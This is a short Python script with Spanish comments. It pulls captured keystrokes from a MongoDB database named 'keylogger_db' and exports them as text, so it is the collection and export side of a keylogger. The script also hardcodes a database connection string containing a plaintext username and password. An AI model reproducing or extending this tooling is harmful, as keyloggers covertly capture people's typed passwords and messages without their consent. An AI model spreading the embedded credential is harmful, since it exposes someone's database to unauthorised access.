from pymongo import MongoClient

# Configuración de la conexión a MongoDB
mongo_uri = "mongodb+srv://iraldejordan10:r5dcxq5RHNDrxt69@jarviscluster.et2fo.mongodb.net/"
client = MongoClient(mongo_uri)
db = client["keylogger_db"]       # Nombre de la base de datos
collection = db["keystrokes"]     # Nombre de la colección

def is_printable_key(key):
    """Determina si la tecla es un carácter imprimible o un espacio."""
    return key.isalnum() or key in {' ', '.', ',', '!', '?', '-', '_', '(', ')', ':', ';', '"', "'", '/'}

def export_data_to_text_file():
    # Consultar todos los datos de la colección
    records = collection.find()

    # Nombre del archivo de salida
    output_file = 'KeyloggerPersonal\\keystrokes_output.txt'

    # Procesar los datos y añadir espacios cuando sea necesario
    text_data = ''
    for record in records:
        key = record.get('text', '')
        for char in key:
            if char == ' ':
                text_data += ' '
            elif is_printable_key(char):
                text_data += char
            else:
                print(f"Entrada No Anotada: {char}")

    # Escribir los datos en el archivo de texto
    with open(output_file, 'w') as file:
        file.write(text_data)

    print(f'Datos exportados a {output_file}')

# Ejecutar la función para exportar los datos
export_data_to_text_file()
